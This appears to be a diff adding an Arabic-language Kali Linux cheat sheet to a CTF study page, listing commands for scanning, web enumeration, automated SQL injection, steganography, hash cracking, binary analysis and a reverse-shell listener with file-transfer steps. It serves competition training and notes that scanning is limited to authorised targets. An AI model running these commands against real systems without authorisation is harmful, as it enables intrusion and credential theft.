@@ -792,6 +792,93 @@
       <li><b>Ghidra</b> — الهندسة العكسية للبرامج. <b>Aperi'Solve</b> — يشغّل أدوات إخفاء الصور دفعة واحدة.</li>
     </ul>
   </div>
+
+  <div class="card" style="border-color:var(--purple)">
+    <h2>🐉 كالي لينكس: نصائح وحيل</h2>
+    <p>كالي يأتي بكل هذه الأدوات مثبّتة مسبقاً. هذه أوامر «الذهاب إليها مباشرة» لكل نوع تحدٍّ — احفظها قبل المسابقة، فكلها مراجع جاهزة لا تحتاج إنترنت ولا ذكاءً اصطناعياً. استبدل <code class="cp">&lt;ip&gt;</code> و<code class="cp">&lt;url&gt;</code> بهدفك.</p>
+  </div>
+
+  <div class="grid2">
+    <div class="card">
+      <h3>🛰️ الاستطلاع والمسح</h3>
+      <table>
+        <tr><td class="muted">مسح سريع + نسخ وخدمات</td><td><code class="cp">nmap -sC -sV -oA scan &lt;ip&gt;</code></td></tr>
+        <tr><td class="muted">كل المنافذ بسرعة</td><td><code class="cp">nmap -p- --min-rate 5000 &lt;ip&gt;</code></td></tr>
+        <tr><td class="muted">UDP الشائعة</td><td><code class="cp">nmap -sU --top-ports 50 &lt;ip&gt;</code></td></tr>
+        <tr><td class="muted">اكتشاف الأجهزة</td><td><code class="cp">netdiscover -r 10.0.0.0/24</code> · <code class="cp">arp-scan -l</code></td></tr>
+        <tr><td class="muted">مسح شامل آلي</td><td><code class="cp">autorecon &lt;ip&gt;</code></td></tr>
+      </table>
+    </div>
+    <div class="card">
+      <h3>🌐 تعداد الويب</h3>
+      <table>
+        <tr><td class="muted">مجلّدات</td><td><code class="cp">gobuster dir -u http://&lt;ip&gt; -w /usr/share/wordlists/dirb/common.txt -x php,txt</code></td></tr>
+        <tr><td class="muted">تشويش عام</td><td><code class="cp">ffuf -u http://&lt;ip&gt;/FUZZ -w &lt;list&gt; -e .php,.html</code></td></tr>
+        <tr><td class="muted">نطاقات فرعية</td><td><code class="cp">ffuf -u http://&lt;ip&gt; -H "Host: FUZZ.site" -w &lt;list&gt; -fs 0</code></td></tr>
+        <tr><td class="muted">بصمة + ثغرات</td><td><code class="cp">whatweb &lt;url&gt;</code> · <code class="cp">nikto -h &lt;url&gt;</code></td></tr>
+        <tr><td class="muted">ووردبريس</td><td><code class="cp">wpscan --url &lt;url&gt; --enumerate u</code></td></tr>
+        <tr><td class="muted">حقن SQL آلي</td><td><code class="cp">sqlmap -u "&lt;url&gt;?id=1" --batch --dbs</code></td></tr>
+      </table>
+      <div class="muted small-t">في المسابقة: الفحص مسموح على أنظمة التحدي فقط. لا تستهدف أي شيء خارج النطاق المصرّح به.</div>
+    </div>
+  </div>
+
+  <div class="grid2">
+    <div class="card">
+      <h3>🗂️ التحليل الجنائي والإخفاء</h3>
+      <table>
+        <tr><td class="muted">النوع والبيانات المخبّأة</td><td><code class="cp">file f</code> · <code class="cp">binwalk -e f</code> · <code class="cp">foremost f</code></td></tr>
+        <tr><td class="muted">نصوص + بحث عن العلم</td><td><code class="cp">strings -n 8 f | grep -i flag</code></td></tr>
+        <tr><td class="muted">بيانات وصفية</td><td><code class="cp">exiftool f</code></td></tr>
+        <tr><td class="muted">استخراج من صورة</td><td><code class="cp">steghide extract -sf img.jpg</code> (يطلب كلمة سر)</td></tr>
+        <tr><td class="muted">كسر كلمة سر steghide</td><td><code class="cp">stegseek img.jpg rockyou.txt</code></td></tr>
+        <tr><td class="muted">LSB في PNG</td><td><code class="cp">zsteg img.png</code> · <code class="cp">zsteg -a img.png</code></td></tr>
+        <tr><td class="muted">ذاكرة (Volatility)</td><td><code class="cp">vol3 -f mem.raw windows.info</code></td></tr>
+        <tr><td class="muted">حزم الشبكة</td><td><code class="cp">tshark -r cap.pcap -Y http</code> · أو Wireshark</td></tr>
+      </table>
+    </div>
+    <div class="card">
+      <h3>🔑 كسر الهاش وكلمات المرور</h3>
+      <table>
+        <tr><td class="muted">تعرّف على الهاش</td><td><code class="cp">hashid &lt;hash&gt;</code> · <code class="cp">hash-identifier</code></td></tr>
+        <tr><td class="muted">John بقائمة</td><td><code class="cp">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code></td></tr>
+        <tr><td class="muted">John بصيغة محدّدة</td><td><code class="cp">john --format=raw-md5 hash.txt</code> · <code class="cp">--show</code></td></tr>
+        <tr><td class="muted">استخراج هاش من ملف</td><td><code class="cp">zip2john f.zip &gt; h</code> · <code class="cp">ssh2john</code> · <code class="cp">rar2john</code></td></tr>
+        <tr><td class="muted">Hashcat</td><td><code class="cp">hashcat -m 0 hash.txt rockyou.txt</code></td></tr>
+        <tr><td class="muted">أوضاع hashcat شائعة</td><td><code class="cp">0</code>=MD5 · <code class="cp">100</code>=SHA1 · <code class="cp">1400</code>=SHA256 · <code class="cp">1700</code>=SHA512 · <code class="cp">1000</code>=NTLM · <code class="cp">1800</code>=sha512crypt · <code class="cp">3200</code>=bcrypt</td></tr>
+        <tr><td class="muted">أول مرة: فكّ rockyou</td><td><code class="cp">gunzip /usr/share/wordlists/rockyou.txt.gz</code></td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="grid2">
+    <div class="card">
+      <h3>⚙️ الهندسة العكسية و pwn</h3>
+      <table>
+        <tr><td class="muted">حمايات الثنائي</td><td><code class="cp">checksec --file=./bin</code></td></tr>
+        <tr><td class="muted">تتبّع الاستدعاءات</td><td><code class="cp">ltrace ./bin</code> · <code class="cp">strace ./bin</code></td></tr>
+        <tr><td class="muted">تفكيك</td><td><code class="cp">objdump -d -M intel ./bin</code></td></tr>
+        <tr><td class="muted">تحليل تفاعلي</td><td><code class="cp">r2 -A ./bin</code> · gdb+pwndbg · Ghidra</td></tr>
+        <tr><td class="muted">أدوات ROP</td><td><code class="cp">ROPgadget --binary ./bin</code></td></tr>
+        <tr><td class="muted">استغلال بايثون</td><td><code class="cp">from pwn import *</code></td></tr>
+        <tr><td class="muted">ثغرات معروفة</td><td><code class="cp">searchsploit &lt;term&gt;</code></td></tr>
+      </table>
+    </div>
+    <div class="card websec-def">
+      <h3>💡 حيل الطرفية والنظام</h3>
+      <ul class="small-t">
+        <li><b>قوائم الكلمات:</b> <code class="cp">/usr/share/wordlists/</code> (rockyou, dirb). المزيد: <code class="cp">sudo apt install seclists</code> → <code class="cp">/usr/share/seclists/</code>.</li>
+        <li><b>مستمع عكسي:</b> <code class="cp">nc -lvnp 4444</code> — ثم ارفع الاتصال من الهدف.</li>
+        <li><b>خادم ملفات سريع:</b> <code class="cp">python3 -m http.server 8000</code> ثم <code class="cp">wget http://&lt;you&gt;:8000/f</code>.</li>
+        <li><b>جلسات دائمة:</b> استخدم <code class="cp">tmux</code> — لا تفقد عملك إذا انقطع الاتصال. <code class="cp">tmux new -s ctf</code>.</li>
+        <li><b>الطرفية:</b> <code class="cp">CTRL+R</code> بحث في السجل · <code class="cp">!!</code> آخر أمر · <code class="cp">sudo !!</code>.</li>
+        <li><b>النسخ للحافظة:</b> <code class="cp">echo flag | xclip -sel clip</code>.</li>
+        <li><b>التحديث:</b> <code class="cp">sudo apt update &amp;&amp; sudo apt full-upgrade</code> (قبل المسابقة لا أثناءها).</li>
+        <li><b>بيئة آمنة:</b> شغّل كالي داخل جهاز افتراضي وخذ <b>لقطة (snapshot)</b> قبل كل جلسة.</li>
+      </ul>
+      <div class="muted small-t">تذكير: الذكاء الاصطناعي ممنوع أثناء المسابقة، لكن هذه الأوامر والأدوات مُثبّتة مسبقاً ومسموحة تماماً — المهارة في معرفتها عن ظهر قلب.</div>
+    </div>
+  </div>
 </section>
 </main>
 
